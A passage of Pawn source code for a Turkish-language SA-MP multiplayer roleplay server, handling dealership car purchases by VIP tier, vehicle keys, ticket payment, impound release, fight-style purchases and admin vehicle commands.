 				SendClientMessage(playerid, COLOR_GREY, "Bu bayideki araçlar yalnýzca Elmas VIP'e sahip olanlar içindir.");
				RemovePlayerFromVehicle(playerid);
				new Float:slx, Float:sly, Float:slz;
				GetPlayerPos(playerid, slx, sly, slz);
				SetPlayerPos(playerid, slx, sly, slz+1.2);
				TogglePlayerControllable(playerid, 1);
				return 1;
            }

            new playervehicleid = GetPlayerFreeVehicleId(playerid),
				totalvehicles = GetPlayerVehicleCountEx(playerid);
            // (TEMPORARY - ZHAO NOTE) TempDonator not added yet
			if(PlayerInfo[playerid][pDonator] == 0 && totalvehicles >= 5) //PlayerInfo[playerid][pTempDonator] > 0) && carsamount >= 5)
			{
                SendClientMessage(playerid, COLOR_GREY, "Hata: Daha fazla araç satýn alamazsýn. VIP olmayanlar 5 araç barýndýrabilirler.");
                RemovePlayerFromVehicle(playerid);
                new Float:slx, Float:sly, Float:slz;
				GetPlayerPos(playerid, slx, sly, slz);
				SetPlayerPos(playerid, slx, sly, slz+1.2);
                TogglePlayerControllable(playerid, 1);
                return 1;
			}
            if(PlayerInfo[playerid][pDonator] == 1 && totalvehicles >= 7)
            {
                SendClientMessage(playerid, COLOR_GREY, "Hata: Daha fazla araç satýn alamazsýn. Yakut VIP 'e sahip olanlar 7 araç barýndýrabilirler.");
                RemovePlayerFromVehicle(playerid);
                new Float:slx, Float:sly, Float:slz;
				GetPlayerPos(playerid, slx, sly, slz);
				SetPlayerPos(playerid, slx, sly, slz+1.2);
                TogglePlayerControllable(playerid, 1);
                return 1;
            }
            if(PlayerInfo[playerid][pDonator] == 2 && totalvehicles >= 8)
            {
                SendClientMessage(playerid, COLOR_GREY, "Hata: Daha fazla araç satýn alamazsýn. Safir VIP 'e sahip olanlar 8 araç barýndýrabilirler.");
                RemovePlayerFromVehicle(playerid);
                new Float:slx, Float:sly, Float:slz;
				GetPlayerPos(playerid, slx, sly, slz);
				SetPlayerPos(playerid, slx, sly, slz+1.2);
                TogglePlayerControllable(playerid, 1);
                return 1;
            }
            if(PlayerInfo[playerid][pDonator] == 3 && totalvehicles >= 10)
            {
                SendClientMessage(playerid, COLOR_GREY, "Hata: Daha fazla araç satýn alamazsýn. Elmas VIP 'e sahip olanlar 10 araç barýndýrabilirler.");
                RemovePlayerFromVehicle(playerid);
                new Float:slx, Float:sly, Float:slz;
				GetPlayerPos(playerid, slx, sly, slz);
				SetPlayerPos(playerid, slx, sly, slz+1.2);
                TogglePlayerControllable(playerid, 1);
                return 1;
            }
		    if(playervehicleid == -1)
		    {
		        SendClientMessage(playerid, COLOR_GREY, "Hata: Daha fazla araç satýn alamazsýn.");
                RemovePlayerFromVehicle(playerid);
                new Float:slx, Float:sly, Float:slz;
				GetPlayerPos(playerid, slx, sly, slz);
				SetPlayerPos(playerid, slx, sly, slz+1.2);
                TogglePlayerControllable(playerid, 1);
                return 1;
		    }
           	if(PlayerInfo[playerid][pDonator] == 0 && VehicleSpawned[playerid] > 0)
           	{
            	SendClientMessage(playerid, COLOR_GREY, "VIP olmadan ayný anda maksimum 1 araç çýkarabilirsin. Araç satýn alabilmek için diðerini sakla.");
                RemovePlayerFromVehicle(playerid);
                new Float:slx, Float:sly, Float:slz;
				GetPlayerPos(playerid, slx, sly, slz);
				SetPlayerPos(playerid, slx, sly, slz+1.2);
                TogglePlayerControllable(playerid, 1);
				return 1;
           	}
         	if(PlayerInfo[playerid][pDonator] == 1 && VehicleSpawned[playerid] > 1)
         	{
         		SendClientMessage(playerid, COLOR_GREY, "Hata: Yakut VIP olarak ayný anda maksimum 2 araç çýkarabilirsin. Araç satýn alabilmek için bir tanesini sakla.");
                RemovePlayerFromVehicle(playerid);
                new Float:slx, Float:sly, Float:slz;
				GetPlayerPos(playerid, slx, sly, slz);
				SetPlayerPos(playerid, slx, sly, slz+1.2);
                TogglePlayerControllable(playerid, 1);
				return 1;
           	}
         	if(PlayerInfo[playerid][pDonator] == 2 && VehicleSpawned[playerid] > 2)
         	{
        		SendClientMessage(playerid, COLOR_GREY, "Hata: Safir VIP olarak ayný anda maksimum 3 araç çýkarabilirsin. Araç satýn alabilmek için bir tanesini sakla.");
                RemovePlayerFromVehicle(playerid);
                new Float:slx, Float:sly, Float:slz;
				GetPlayerPos(playerid, slx, sly, slz);
				SetPlayerPos(playerid, slx, sly, slz+1.2);
                TogglePlayerControllable(playerid, 1);
				return 1;
           	}
          	if(PlayerInfo[playerid][pDonator] == 3 && VehicleSpawned[playerid] > 3)
          	{
  				SendClientMessage(playerid, COLOR_GREY, "Hata: Elmas VIP olarak ayný anda maksimum 4 araç çýkarabilirsin. Araç satýn alabilmek için bir tanesini sakla.");
                RemovePlayerFromVehicle(playerid);
                new Float:slx, Float:sly, Float:slz;
				GetPlayerPos(playerid, slx, sly, slz);
				SetPlayerPos(playerid, slx, sly, slz+1.2);
                TogglePlayerControllable(playerid, 1);
				return 1;
           	}
           	/*if(PlayerInfo[playerid][pDonator] == 4 && VehicleSpawned[playerid] >= 5)
           	{
				SendClientMessage(playerid, COLOR_GREY, "Hata: You can only have 5 vehicles spawned at a time as Undefined Donator. Store one vehicle in order to purchase one.");
                RemovePlayerFromVehicle(playerid);
                new Float:slx, Float:sly, Float:slz;
				GetPlayerPos(playerid, slx, sly, slz);
				SetPlayerPos(playerid, slx, sly, slz+1.2);
                TogglePlayerControllable(playerid, 1);
				return 1;
           	}
           	if(PlayerInfo[playerid][pDonator] == 5 && VehicleSpawned[playerid] >= 5)
           	{
				SendClientMessage(playerid, COLOR_GREY, "Hata: You can only have 5 vehicles spawned at a time as VIP Moderator. Store one vehicle in order to purchase one.");
                RemovePlayerFromVehicle(playerid);
                new Float:slx, Float:sly, Float:slz;
				GetPlayerPos(playerid, slx, sly, slz);
				SetPlayerPos(playerid, slx, sly, slz+1.2);
                TogglePlayerControllable(playerid, 1);
				return 1;
           	}*/
           	if(PlayerInfo[playerid][pDonator] < 0 || PlayerInfo[playerid][pDonator] > 3)
           	{
           	    SendClientMessage(playerid, COLOR_GREY, "Hata: Bilinmeyen VIP leveli.");
            	RemovePlayerFromVehicle(playerid);
                new Float:slx, Float:sly, Float:slz;
				GetPlayerPos(playerid, slx, sly, slz);
				SetPlayerPos(playerid, slx, sly, slz+1.2);
                TogglePlayerControllable(playerid, 1);
				return 1;
           	}
		    new randcolor1 = Random(0, 126);
		    new randcolor2 = Random(0, 126);
		    SetPlayerPos(playerid, CarDealershipInfo[d][cdVehicleSpawn][0], CarDealershipInfo[d][cdVehicleSpawn][1], CarDealershipInfo[d][cdVehicleSpawn][2]+2);
		    TogglePlayerControllable(playerid, 1);
		    new cost;
		    if(PlayerInfo[playerid][pDonator] < 1)
            {
                cost = CarDealershipInfo[d][cdVehicleCost][v];
	            if(PlayerInfo[playerid][pCash] < CarDealershipInfo[d][cdVehicleCost][v])
	            {
					SendClientMessage(playerid, COLOR_GRAD1, "Hata: Bunu satýn almak için paran yok.");
					RemovePlayerFromVehicle(playerid);
					new Float:slx, Float:sly, Float:slz;
					GetPlayerPos(playerid, slx, sly, slz);
					SetPlayerPos(playerid, slx, sly, slz+1.2);
					return 1;
	            }
                format(string, sizeof(string), "%s'dan aldýðýnýz için teþekkürler.", CarDealershipInfo[d][cdMessage]);
		        SendClientMessage(playerid, COLOR_GRAD1, string);
				PlayerInfo[playerid][pCash] -= CarDealershipInfo[d][cdVehicleCost][v];
		        CarDealershipInfo[d][cdTill] += (CarDealershipInfo[d][cdVehicleCost][v] * 40) / (100);
	        }
	        else
	        {
				if(CarDealershipInfo[d][cdDonator] > 0) cost = CarDealershipInfo[d][cdVehicleCost][v];
				else cost = (CarDealershipInfo[d][cdVehicleCost][v] * 80) / (100);
	            if(PlayerInfo[playerid][pCash] < cost)
	            {
					SendClientMessage(playerid, COLOR_GRAD1, "Hata: Bunu satýn almak için paran yok.");
					RemovePlayerFromVehicle(playerid);
					new Float:slx, Float:sly, Float:slz;
					GetPlayerPos(playerid, slx, sly, slz);
					SetPlayerPos(playerid, slx, sly, slz+1.2);
					return 1;
	            }
       		   	if(AdminDuty[playerid] == 1)
 				{
  					SendClientMessage(playerid, COLOR_GRAD1, "Hata: Ýþbaþý yapmýþ bir adminken araç satýn alamazsýn.");
					RemovePlayerFromVehicle(playerid);
					new Float:slx, Float:sly, Float:slz;
					GetPlayerPos(playerid, slx, sly, slz);
					SetPlayerPos(playerid, slx, sly, slz+1.2);
					return 1;
				}

                format(string, sizeof(string), "%s'dan aldýðýnýz için teþekkürler.", CarDealershipInfo[d][cdMessage]);
		        SendClientMessage(playerid, COLOR_GRAD1, string);
		        PlayerInfo[playerid][pCash] -= cost;
				CarDealershipInfo[d][cdTill] += cost;
     		}

            new car = CreatePlayerVehicle(playerid, playervehicleid, CarDealershipInfo[d][cdVehicleModel][v], CarDealershipInfo[d][cdVehicleSpawn][0], CarDealershipInfo[d][cdVehicleSpawn][1], CarDealershipInfo[d][cdVehicleSpawn][2], CarDealershipInfo[d][cdVehicleSpawn][3], randcolor1, randcolor2, cost);
            SetTimerEx("PutPlayerInVeh", 2000, 0, "dd", playerid, car);
            SavecDealerships();
		}
		else
		{
            RemovePlayerFromVehicle(playerid);
            new Float:slx, Float:sly, Float:slz;
			GetPlayerPos(playerid, slx, sly, slz);
			SetPlayerPos(playerid, slx, sly, slz+1.2);
            TogglePlayerControllable(playerid, 1);
			return 1;
		}
	}
	else if(dialogid == DIALOG_CDSELL)
	{
		if(response)
		{
			if(GetPVarInt(playerid, "editingcd") == -1) return 1;
			PlayerInfo[playerid][pCash] += (CarDealershipInfo[GetPVarInt(playerid, "editingcd")][cdPrice] / 2);
			SellCarDealership(GetPVarInt(playerid, "editingcd"));
			PlayerPlayMusic(playerid);
			format(string, sizeof(string), "Araç bayisi baþarýlý bir þekilde %d'a satýldý.", CarDealershipInfo[GetPVarInt(playerid, "editingcd")][cdPrice] / 2);
			SendClientMessage(playerid, COLOR_WHITE, string);
		}
		else
		{
            SetPVarInt(playerid, "editingcd", -1);
			return 1;
		}
	}
	if(dialogid == FIGHTMENU)
	{
		if(response)
		{
			if(GetPlayerCash(playerid) >= 5000)
			{
				if(listitem == 0)
				{
			    	PlayerInfo[playerid][pFightStyle] = FIGHT_STYLE_BOXING;
					SetPlayerFightingStyle (playerid, FIGHT_STYLE_BOXING);
					SendClientMessage(playerid, COLOR_WHITE, "Artýk boks dövüþ stilini kullanýyorsun.");
					GivePlayerCash(playerid, -5000);
				}
				if(listitem == 1)
				{
					PlayerInfo[playerid][pFightStyle] = FIGHT_STYLE_ELBOW;
					SetPlayerFightingStyle (playerid, FIGHT_STYLE_ELBOW);
					SendClientMessage(playerid, COLOR_WHITE, "Artýk elbow dövüþ stilini kullanýyorsun.");
					GivePlayerCash(playerid, -5000);
				}
				if(listitem == 2)
				{
			    	PlayerInfo[playerid][pFightStyle] = FIGHT_STYLE_KNEEHEAD;
				    SetPlayerFightingStyle (playerid, FIGHT_STYLE_KNEEHEAD);
				    SendClientMessage(playerid, COLOR_WHITE, "Artýk kneehead dövüþ stilini kullanýyorsun.");
					GivePlayerCash(playerid, -5000);

				}
				if(listitem == 3)
				{
   					PlayerInfo[playerid][pFightStyle] = FIGHT_STYLE_KUNGFU;
					SetPlayerFightingStyle (playerid, FIGHT_STYLE_KUNGFU);
					SendClientMessage(playerid, COLOR_WHITE, "Artýk kungfu dövüþ stilini kullanýyorsun.");
					GivePlayerCash(playerid, -5000);
				}
				if(listitem == 4)
				{
					PlayerInfo[playerid][pFightStyle] = FIGHT_STYLE_GRABKICK;
	    			SetPlayerFightingStyle (playerid, FIGHT_STYLE_GRABKICK);
			  	  	SendClientMessage(playerid, COLOR_WHITE, "Artýk grabkick dövüþ stilini kullanýyorsun.");
					GivePlayerCash(playerid, -5000);
				}
			}
			else
			{
				SendClientMessage(playerid, COLOR_GREY, "Bunun için paran yok!");
				return 1;
			}

			if(listitem == 5)
			{
				PlayerInfo[playerid][pFightStyle] = FIGHT_STYLE_NORMAL;
				SetPlayerFightingStyle (playerid, FIGHT_STYLE_NORMAL);
	  			SendClientMessage(playerid, COLOR_WHITE, "Artýk normal dövüþ stilini kullanýyorsun!");
				return 1;
			}
		}
	}
	if(dialogid == REMOVEKEYS)
	{
	    if(response)
	    {
	        if(PlayerVehicleInfo[playerid][listitem][pvId] == INVALID_PLAYER_VEHICLE_ID) {
	            SendClientMessage(playerid, COLOR_GRAD2, "Olmayan,baðlanmýþ yada saklý olan bir anacýn anahtarlarýný geri alamazsýn.");
	            return 1;
			}
	        if(PlayerVehicleInfo[playerid][listitem][pvAllowedplayerid] != PlayerVehicleInfo[playerid][listitem][pvAllowedplayerid])
	        {
	            SendClientMessage(playerid, COLOR_GRAD2, "Bu oyuncu, arabanýn anahtarlarýna sahip deðil.");
	            return 1;
	        }
	        if(PlayerVehicleInfo[playerid][listitem][pvAllowedplayerid] == INVALID_PLAYER_ID)
	        {
	            SendClientMessage(playerid, COLOR_GRAD2, "Bu aracýn anahtarlarýný kimseye vermedin.");
	            return 1;
	        }
			PlayerInfo[PlayerVehicleInfo[playerid][listitem][pvAllowedplayerid]][pVehicleKeys] = INVALID_PLAYER_VEHICLE_ID;
			PlayerInfo[PlayerVehicleInfo[playerid][listitem][pvAllowedplayerid]][pVehicleKeysFrom] = INVALID_PLAYER_ID;
			format(string, sizeof(string), "%s adlý kiþi %s model aracýnýn anahtarlarýný geri aldý.", GetPlayerNameEx(playerid), GetVehicleName(PlayerVehicleInfo[playerid][listitem][pvId]));
			SendClientMessage(PlayerVehicleInfo[playerid][listitem][pvAllowedplayerid], COLOR_GRAD2, string);
			format(string, sizeof(string), "%s model aracýnýn anahtarlarýný %s'dan geri aldýn.", GetVehicleName(PlayerVehicleInfo[playerid][listitem][pvId]),GetPlayerNameEx(PlayerVehicleInfo[playerid][listitem][pvAllowedplayerid]));
			SendClientMessage(playerid, COLOR_GRAD2, string);
			PlayerVehicleInfo[playerid][listitem][pvAllowedplayerid] = INVALID_PLAYER_ID;
	    }
	}
	if(dialogid == GIVEKEYS)
	{
	    if(response)
	    {
			if(PlayerVehicleInfo[playerid][listitem][pvId] == INVALID_PLAYER_VEHICLE_ID) {
	            SendClientMessage(playerid, COLOR_GRAD2, "Olmayan,baðlanmýþ yada saklý olan bir aracýn anahtarlarýný veremezsin.");
	            GiveKeysTo[playerid] = INVALID_PLAYER_ID;
	            return 1;
			}
	        if(PlayerVehicleInfo[playerid][listitem][pvAllowedplayerid] != INVALID_PLAYER_ID)
	        {
	            SendClientMessage(playerid, COLOR_GRAD2, "Bu aracýn anahtarlarýný baþkasýna vermiþsin.");
	            GiveKeysTo[playerid] = INVALID_PLAYER_ID;
	            return 1;
	        }
	        if(PlayerInfo[GiveKeysTo[playerid]][pVehicleKeysFrom] != INVALID_PLAYER_ID)
	        {
	            SendClientMessage(playerid, COLOR_GRAD2, "Bu kiþi zaten baþka bir aracýn anahtarlarýna sahip.");
	            GiveKeysTo[playerid] = INVALID_PLAYER_ID;
	            return 1;
	        }
			PlayerVehicleInfo[playerid][listitem][pvAllowedplayerid] = GiveKeysTo[playerid];
			PlayerInfo[GiveKeysTo[playerid]][pVehicleKeys] = listitem;
			PlayerInfo[GiveKeysTo[playerid]][pVehicleKeysFrom] = playerid;
			format(string, sizeof(string), "%s adlý kiþi sana %s model aracýnýn anahtarlarýný verdi.", GetPlayerNameEx(playerid), GetVehicleName(PlayerVehicleInfo[playerid][listitem][pvId]));
			SendClientMessage(GiveKeysTo[playerid], COLOR_GRAD2, string);
			format(string, sizeof(string), "%s adlý kiþiye %s model aracýnýn anahtarlarýný verdin.", GetPlayerNameEx(GiveKeysTo[playerid]), GetVehicleName(PlayerVehicleInfo[playerid][listitem][pvId]));
			SendClientMessage(playerid, COLOR_GRAD2, string);
			GiveKeysTo[playerid] = INVALID_PLAYER_ID;
	    }
	}
	if(dialogid == MPSPAYTICKETSCOP)
	{
	    if(response)
	    {
			new
				szMessage[128],
				iTargetID = GetPVarInt(playerid, "vRel");

			if(PlayerVehicleInfo[iTargetID][listitem][pvTicket]) {
				format(szMessage, sizeof(szMessage), "%s adlý oyuncunun %s model aracýnýn $%d cezasýný ödedin.", GetPlayerNameEx(iTargetID), PlayerVehicleInfo[iTargetID][listitem][pvTicket], VehicleName[PlayerVehicleInfo[iTargetID][listitem][pvModelId] - 400]);
				SendClientMessage(playerid, COLOR_GRAD2, szMessage);

				format(szMessage, sizeof(szMessage), "%s adlý kiþi %s model aracýnýn cezalarýný ödedi. (%i).", GetPlayerNameEx(playerid), VehicleName[PlayerVehicleInfo[iTargetID][listitem][pvModelId] - 400], PlayerVehicleInfo[iTargetID][listitem][pvTicket]);
				SendClientMessage(iTargetID, COLOR_LIGHTBLUE, szMessage);
				PlayerVehicleInfo[iTargetID][listitem][pvTicket] = 0;
			}
			else if(PlayerVehicleInfo[iTargetID][listitem][pvImpounded])
			{
				if(PlayerInfo[iTargetID][pDonator] == 0 && VehicleSpawned[iTargetID] >= 1)
				{
					SendClientMessage(playerid, COLOR_GREY, "Bu oyuncunun ayný anda çýkardýðý araç sayýsý maksimum seviyede. Bu yüzden aracý çýkarýlamýyor.");
					return 1;
				}
				if(PlayerInfo[iTargetID][pDonator] == 1 && VehicleSpawned[iTargetID] >= 1)
				{
					SendClientMessage(playerid, COLOR_GREY, "Bu oyuncunun ayný anda çýkardýðý araç sayýsý maksimum seviyede. Bu yüzden aracý çýkarýlamýyor.");
					return 1;
				}
				if(PlayerInfo[iTargetID][pDonator] == 2 && VehicleSpawned[iTargetID] >= 2)
				{
					SendClientMessage(playerid, COLOR_GREY, "Bu oyuncunun ayný anda çýkardýðý araç sayýsý maksimum seviyede. Bu yüzden aracý çýkarýlamýyor.");
					return 1;
				}
				if(PlayerInfo[iTargetID][pDonator] == 3 && VehicleSpawned[iTargetID] >= 3)
	 			{
					SendClientMessage(playerid, COLOR_GREY, "Bu oyuncunun ayný anda çýkardýðý araç sayýsý maksimum seviyede. Bu yüzden aracý çýkarýlamýyor.");
					return 1;
			 	}
				if(PlayerInfo[iTargetID][pDonator] == 4 && VehicleSpawned[iTargetID] >= 5)
				{
					SendClientMessage(playerid, COLOR_GREY, "Bu oyuncunun ayný anda çýkardýðý araç sayýsý maksimum seviyede. Bu yüzden aracý çýkarýlamýyor.");
					return 1;
				}
				if(PlayerInfo[iTargetID][pDonator] == 5 && VehicleSpawned[iTargetID] >= 5)
				{
					SendClientMessage(playerid, COLOR_GREY, "Bu oyuncunun ayný anda çýkardýðý araç sayýsý maksimum seviyede. Bu yüzden aracý çýkarýlamýyor.");
					return 1;
				}
				if(PlayerInfo[iTargetID][pDonator] < 0 || PlayerInfo[iTargetID][pDonator] > 5)
				{
					SendClientMessage(playerid, COLOR_GREY, "Bu oyuncunun ayný anda çýkardýðý araç sayýsý maksimum seviyede. Bu yüzden aracý çýkarýlamýyor.");
					return 1;
				}

				format(szMessage, sizeof(szMessage), "%s adlý oyuncunun %s model aracýný serbest býraktýn.", GetPlayerNameEx(iTargetID), VehicleName[PlayerVehicleInfo[iTargetID][listitem][pvModelId] - 400]);
				SendClientMessage(playerid, COLOR_LIGHTBLUE, szMessage);

				format(szMessage, sizeof(szMessage), "%s adlý kiþi baðlanmýþ olan %s model aracýný serbest býraktý.", GetPlayerNameEx(playerid), VehicleName[PlayerVehicleInfo[iTargetID][listitem][pvModelId] - 400]);
				SendClientMessage(iTargetID, COLOR_LIGHTBLUE, szMessage);

				format(szMessage, sizeof(szMessage), "Merkez: %, %s adlý kiþinin %s model baðlanmýþ aracýný serbest býraktý.", GetPlayerNameEx(playerid), GetPlayerNameEx(iTargetID), VehicleName[PlayerVehicleInfo[iTargetID][listitem][pvModelId] - 400]);
				SendRadioMessage(PlayerInfo[playerid][pFaction], RADIO, szMessage);

				PlayerVehicleInfo[iTargetID][listitem][pvImpounded] = 0;
				PlayerVehicleInfo[playerid][listitem][pvSpawned] = 1;
				PlayerVehicleInfo[iTargetID][listitem][pvPosX] = 813.8251;
				PlayerVehicleInfo[iTargetID][listitem][pvPosY] = -601.5270;
				PlayerVehicleInfo[iTargetID][listitem][pvPosZ] = 16.0430;
				PlayerVehicleInfo[iTargetID][listitem][pvPosAngle] = 89.0223;
				PlayerVehicleInfo[iTargetID][listitem][pvTicket] = 0;
				VehicleSpawned[iTargetID]++;
				++PlayerCars;

				PlayerVehicleInfo[iTargetID][listitem][pvId] = CreateVehicle(PlayerVehicleInfo[iTargetID][listitem][pvModelId], PlayerVehicleInfo[iTargetID][listitem][pvPosX], PlayerVehicleInfo[iTargetID][listitem][pvPosY], PlayerVehicleInfo[iTargetID][listitem][pvPosZ], PlayerVehicleInfo[iTargetID][listitem][pvPosAngle],PlayerVehicleInfo[iTargetID][listitem][pvColor1], PlayerVehicleInfo[iTargetID][listitem][pvColor2], -1);
				//VehicleFuel[PlayerVehicleInfo[iTargetID][listitem][pvId]] = PlayerVehicleInfo[iTargetID][listitem][pvFuel];
				if(PlayerVehicleInfo[iTargetID][listitem][pvLocked] == 1) LockPlayerVehicle(iTargetID, PlayerVehicleInfo[iTargetID][listitem][pvId], PlayerVehicleInfo[iTargetID][listitem][pvLock]);
				LoadPlayerVehicleMods(iTargetID, listitem);
			}
			else SendClientMessage(playerid, COLOR_GRAD2, "Bu araç mevcut deðil, serbest býrakýlmasý gerekmiyor veya cezalarý ödenmiþ.");
	    }
		return 1;
	}
	if(dialogid == MPSPAYTICKETS)
	{
	    if(response)
	    {
			new
				szMessage[128];

			if(PlayerInfo[playerid][pWantedLevel] != 0)
			{
				format(szMessage, sizeof(szMessage), "%s adlý suçlu %i suç ile aracýný serbest býrakmayý yada cezasýný ödemeye çalýþtý.", GetPlayerNameEx(playerid), PlayerInfo[playerid][pWantedLevel]);
				SendRadioMessage(1, DEPTRADIO, szMessage);
				SendRadioMessage(2, DEPTRADIO, szMessage);

				return SendClientMessage(playerid, COLOR_YELLOW, "Polis arananlar listesinde olduðun hakkýnda uyarýldý.");
			}
			if(PlayerVehicleInfo[playerid][listitem][pvTicket]) {
				if(GetPlayerCash(playerid) < PlayerVehicleInfo[playerid][listitem][pvTicket]) {
					return SendClientMessage(playerid, COLOR_GRAD2, "Cezayý ödeyebilmek için yeterli paran yok.");
				}
				GivePlayerCash(playerid, -PlayerVehicleInfo[playerid][listitem][pvTicket]);
				format(szMessage, sizeof(szMessage), "%s model aracýnýn $%d'lýk cezasýný ödedin.", PlayerVehicleInfo[playerid][listitem][pvTicket], VehicleName[PlayerVehicleInfo[playerid][listitem][pvModelId] - 400]);
				SendClientMessage(playerid, COLOR_GRAD2, szMessage);
				PlayerVehicleInfo[playerid][listitem][pvTicket] = 0;
			}
			else if(PlayerVehicleInfo[playerid][listitem][pvImpounded]) {

				new iCost = (PlayerVehicleInfo[playerid][listitem][pvPrice] / 10) + PlayerVehicleInfo[playerid][listitem][pvTicket] + (PlayerInfo[playerid][pLevel] * 10);

		    	if(iCost > 1000)
		    	{
		        	iCost = 1000;
		    	}

				if(GetPlayerCash(playerid) < iCost) {
					return SendClientMessage(playerid, COLOR_GRAD2, "Üzerinde yeterli para yok.");
				}

    			if(PlayerInfo[playerid][pDonator] == 0 && VehicleSpawned[playerid] > 0)
				{
					SendClientMessage(playerid, COLOR_GREY, "VIP olmadan ayný anda yalnýzca 1 araç çýkarabilirsin. Baþka çýkarmak için diðerini sakla.");
					return 1;
				}
				if(PlayerInfo[playerid][pDonator] == 1 && VehicleSpawned[playerid] > 1)
				{
					SendClientMessage(playerid, COLOR_GREY, "Yakut VIP'e sahip olduðundan dolayý ayný anda 2 araç çýkarabilirsin.");
					return 1;
				}
				if(PlayerInfo[playerid][pDonator] == 2 && VehicleSpawned[playerid] > 2)
				{
					SendClientMessage(playerid, COLOR_GREY, "Safir VIP'e sahip olduðundan dolayý ayný anda 3 araç çýkarabilirsin.");
					return 1;
				}
				if(PlayerInfo[playerid][pDonator] == 3 && VehicleSpawned[playerid] > 3)
	 			{
					SendClientMessage(playerid, COLOR_GREY, "Elmas VIP'e sahip olduðundan dolayý ayný anda 4 araç çýkarabilirsin.");
					return 1;
			 	}
				/*if(PlayerInfo[playerid][pDonator] == 4 && VehicleSpawned[playerid] >= 5)
				{
					SendClientMessage(playerid, COLOR_GREY, "As Undefined Donator you can only have 5 vehicles spawned. You must store a vehicle in order to spawn another one.");
					return 1;
				}
				if(PlayerInfo[playerid][pDonator] == 5 && VehicleSpawned[playerid] >= 5)
				{
					SendClientMessage(playerid, COLOR_GREY, "As VIP Moderator you can only have 5 vehicles spawned. You must store a vehicle in order to spawn another one.");
					return 1;
				}*/
				if(PlayerInfo[playerid][pDonator] < 0 || PlayerInfo[playerid][pDonator] > 3)
				{
					SendClientMessage(playerid, COLOR_GREY, "Geçersiz VIP leveline sahipsin.");
					return 1;
				}

				format(szMessage, sizeof(szMessage), "%s model aracýný $%i ödeyerek serbest býraktýn.", VehicleName[PlayerVehicleInfo[playerid][listitem][pvModelId] - 400], iCost);
				SendClientMessage(playerid, COLOR_LIGHTBLUE, szMessage);
				GivePlayerCash(playerid, -iCost);

				PlayerVehicleInfo[playerid][listitem][pvImpounded] = 0;
				PlayerVehicleInfo[playerid][listitem][pvSpawned] = 1;
				PlayerVehicleInfo[playerid][listitem][pvPosX] = 813.8251;
				PlayerVehicleInfo[playerid][listitem][pvPosY] = -601.5270;
				PlayerVehicleInfo[playerid][listitem][pvPosZ] = 16.0430;
				PlayerVehicleInfo[playerid][listitem][pvPosAngle] = 89.0223;
				PlayerVehicleInfo[playerid][listitem][pvTicket] = 0;
				VehicleSpawned[playerid]++;
				++PlayerCars;

				PlayerVehicleInfo[playerid][listitem][pvId] = CreateVehicle(PlayerVehicleInfo[playerid][listitem][pvModelId], PlayerVehicleInfo[playerid][listitem][pvPosX], PlayerVehicleInfo[playerid][listitem][pvPosY], PlayerVehicleInfo[playerid][listitem][pvPosZ], PlayerVehicleInfo[playerid][listitem][pvPosAngle],PlayerVehicleInfo[playerid][listitem][pvColor1], PlayerVehicleInfo[playerid][listitem][pvColor2], -1);
				//VehicleFuel[PlayerVehicleInfo[playerid][listitem][pvId]] = PlayerVehicleInfo[playerid][listitem][pvFuel];
				if(PlayerVehicleInfo[playerid][listitem][pvLocked] == 1) LockPlayerVehicle(playerid, PlayerVehicleInfo[playerid][listitem][pvId], PlayerVehicleInfo[playerid][listitem][pvLock]);
				LoadPlayerVehicleMods(playerid, listitem);
			}
			else SendClientMessage(playerid, COLOR_GRAD2, "Bu araç mevcut deðil, serbest býrakýlmasý gerekmiyor veya cezalarý ödenmiþ.");
	    }
		return 1;
	}
	if(dialogid == GOTOPLAYERCAR)
	{
	    if(response == 1)
	    {
	        for(new i = 0; i < MAX_PLAYERVEHICLES; i++)
	        {
	            if(listitem == i)
	            {
					new Float: carPos[3], id = GetPVarInt(playerid, "playeraffectedcarTP");
					if(PlayerVehicleInfo[id][i][pvId] > INVALID_PLAYER_VEHICLE_ID)
					{
						GetVehiclePos(PlayerVehicleInfo[id][i][pvId], carPos[0], carPos[1], carPos[2]);
						SetPlayerVirtualWorld(playerid,GetVehicleVirtualWorld(PlayerVehicleInfo[id][i][pvId]));
						SetPlayerInterior(playerid,0);
						SetPlayerPos(playerid, carPos[0], carPos[1], carPos[2]);
					}
					else
					{
					    SendClientMessage(playerid, COLOR_WHITE, "Boþ, kullanýlamaz halde yada baðlanmýþ bir slota teleport olamazsýn.");
					}
				}
			}
	    }
	}
	if(dialogid == DELETEPLAYERCAR)
	{
	    if(response == 1)
	    {
			new id = GetPVarInt(playerid, "playeraffectedcarTP");

			if(PlayerVehicleInfo[id][listitem][pvSpawned] == 0) {
				PlayerVehicleInfo[id][listitem][pvSpawned] = 1;
				VehicleSpawned[playerid]++;
				PlayerCars++;
				PlayerVehicleInfo[id][listitem][pvId] = CreateVehicle(PlayerVehicleInfo[id][listitem][pvModelId], PlayerVehicleInfo[id][listitem][pvPosX], PlayerVehicleInfo[id][listitem][pvPosY], PlayerVehicleInfo[id][listitem][pvPosZ], PlayerVehicleInfo[id][listitem][pvPosAngle],PlayerVehicleInfo[id][listitem][pvColor1], PlayerVehicleInfo[id][listitem][pvColor2], -1);
			}
			format(string, sizeof(string), "%s, %s adlý oyuncunun %s model aracýný yoketti.", GetPlayerNameEx(playerid), GetPlayerNameEx(id), GetVehicleName(PlayerVehicleInfo[id][listitem][pvId]));
			Log("logs/playervehicle.log", string);

			format(string, sizeof(string), "Admin %s, %s model aracýný sildi.", GetPlayerNameEx(playerid), GetVehicleName(PlayerVehicleInfo[id][listitem][pvId]));
			SendClientMessage(id, COLOR_WHITE, string);

			format(string, sizeof(string), "%s adlý oyuncunun %s model aracýný sildin.", GetPlayerNameEx(id), GetVehicleName(PlayerVehicleInfo[id][listitem][pvId]));
			SendClientMessage(playerid, COLOR_WHITE, string);

			new playervehicleid = GetPlayerVehicle(id, PlayerVehicleInfo[id][listitem][pvId]);
			DestroyPlayerVehicle(id, playervehicleid);
	    }
	}
	if(dialogid == VEHICLESTORAGE && response) {
		if(PlayerVehicleInfo[playerid][listitem][pvSpawned])
		{
			if(IsVehicleOccupied(PlayerVehicleInfo[playerid][listitem][pvId]) != INVALID_VEHICLE_ID)
				return SendClientMessage(playerid, COLOR_GREY, "Aracýn baþkasý tarafýndan sürülüyorken aracýný saklayamazsýn.");

			new
				Float: vehiclehealth;

			GetVehicleHealth(PlayerVehicleInfo[playerid][listitem][pvId], vehiclehealth);

			if(vehiclehealth < 750)
			{
				SendClientMessage(playerid, COLOR_GREY, "Aracýn saklamak için çok hasarlý.");
			}
			else {
			    // Tow check
			    new
			        x;
			    foreach(Player, i) {
